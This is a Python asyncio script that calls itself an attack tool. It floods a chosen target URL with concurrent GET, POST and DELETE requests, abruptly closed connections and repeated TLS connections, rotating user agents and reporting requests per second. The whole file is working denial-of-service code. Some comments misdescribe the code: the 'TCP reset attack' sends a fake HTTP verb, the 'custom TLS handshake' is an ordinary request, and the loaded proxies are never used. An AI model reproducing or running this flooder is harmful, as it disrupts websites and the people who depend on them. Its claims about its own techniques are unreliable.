import asyncio
import random
import time
import os
import json
import aiohttp
import ssl
import socket
from urllib.parse import urlparse

# Configuration
TARGET_URL = os.getenv("TARGET_URL", "https://example.com")
DURATION = int(os.getenv("DURATION", "60"))
CONCURRENCY = int(os.getenv("CONCURRENCY", "50"))
REQ_PER_SEC = int(os.getenv("REQ_PER_SEC", "10"))
PROXY_FILE = os.getenv("PROXY_FILE", "")
METHODS = os.getenv("METHODS", "GET,POST,DELETE,RESET").split(",")

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
]

# Stats
stats = {
    "success": 0,
    "error": 0,
    "bytes_sent": 0,
    "start_time": None,
    "methods": {method: 0 for method in METHODS}
}

# Load proxies
proxies = []
if PROXY_FILE and os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    print(f"Loaded {len(proxies)} proxies")

async def http_flood(session, method, url):
    global stats
    
    try:
        if method == "GET":
            async with session.get(url, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(str(response.headers))
                return response.status
        elif method == "POST":
            data = json.dumps({"data": "x" * 1024})  # 1KB payload
            async with session.post(url, data=data, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(data) + len(str(response.headers))
                return response.status
        elif method == "DELETE":
            async with session.delete(url, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(str(response.headers))
                return response.status
        elif method == "RESET":
            # TCP reset attack
            parsed_url = urlparse(url)
            reader, writer = await asyncio.open_connection(
                parsed_url.hostname, 
                parsed_url.port or (443 if parsed_url.scheme == 'https' else 80),
                ssl=(parsed_url.scheme == 'https')
            )
            
            request = f"RESET / HTTP/1.1\r\nHost: {parsed_url.hostname}\r\n\r\n"
            writer.write(request.encode())
            await writer.drain()
            
            # Abruptly close connection (RST)
            writer.close()
            try:
                await writer.wait_closed()
            except:
                pass
            
            stats["success"] += 1
            stats["methods"][method] += 1
            stats["bytes_sent"] += len(request)
            return 499  # Custom code for connection closed
    except Exception as e:
        stats["error"] += 1
        return None

async def http2_flood(session, url):
    global stats
    
    try:
        # Force HTTP/2
        async with session.get(
            url, 
            ssl=False,
            headers={"User-Agent": random.choice(USER_AGENTS)}
        ) as response:
            stats["success"] += 1
            stats["methods"]["HTTP2"] = stats["methods"].get("HTTP2", 0) + 1
            stats["bytes_sent"] += len(str(response.headers))
            return response.status
    except Exception as e:
        stats["error"] += 1
        return None

async def tls_flood(url):
    global stats
    
    try:
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        
        # Create raw TLS connection
        reader, writer = await asyncio.open_connection(hostname, port, ssl=(parsed_url.scheme == 'https'))
        
        # Craft custom TLS handshake
        request = f"GET / HTTP/1.1\r\nHost: {hostname}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n"
        writer.write(request.encode())
        await writer.drain()
        
        # Read partial response
        await reader.read(1024)
        
        # Close connection
        writer.close()
        await writer.wait_closed()
        
        stats["success"] += 1
        stats["methods"]["TLS"] = stats["methods"].get("TLS", 0) + 1
        stats["bytes_sent"] += len(request)
        return 200
    except Exception as e:
        stats["error"] += 1
        return None

async def worker(session, url):
    global stats
    
    start_time = time.time()
    
    while time.time() - start_time < DURATION:
        # Random method selection
        method = random.choice(METHODS)
        
        # Random delay between requests
        await asyncio.sleep(1.0 / REQ_PER_SEC)
        
        # Execute attack
        if method in ["GET", "POST", "DELETE", "RESET"]:
            await http_flood(session, method, url)
        elif method == "HTTP2":
            await http2_flood(session, url)
        elif method == "TLS":
            await tls_flood(url)
        
        # Log progress every 10 seconds
        if int(time.time()) % 10 == 0:
            elapsed = time.time() - stats["start_time"]
            rps = stats["success"] / max(elapsed, 1)
            print(f"Stats: {stats['success']}/{stats['error']} | RPS: {rps:.1f} | Methods: {stats['methods']}")

async def main():
    global stats
    stats["start_time"] = time.time()
    
    print(f"Starting attack on {TARGET_URL}")
    print(f"Duration: {DURATION}s | Concurrency: {CONCURRENCY} | Methods: {METHODS}")
    
    # Create connector with proxy support
    connector = None
    if proxies:
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
    
    # Create session
    timeout = aiohttp.ClientTimeout(total=10)
    session = aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        headers={"User-Agent": random.choice(USER_AGENTS)}
    )
    
    # Create workers
    tasks = [worker(session, TARGET_URL) for _ in range(CONCURRENCY)]
    await asyncio.gather(*tasks)
    
    # Close session
    await session.close()
    
    # Print final stats
    elapsed = time.time() - stats["start_time"]
    rps = stats["success"] / max(elapsed, 1)
    mb_sent = stats["bytes_sent"] / (1024 * 1024)
    
    print("\n=== Attack Complete ===")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {elapsed:.1f}s")
    print(f"Requests: {stats['success']}/{stats['error']}")
    print(f"RPS: {rps:.1f}")
    print(f"Data sent: {mb_sent:.2f} MB")
    print(f"Methods: {stats['methods']}")

if __name__ == "__main__":
    asyncio.run(main())
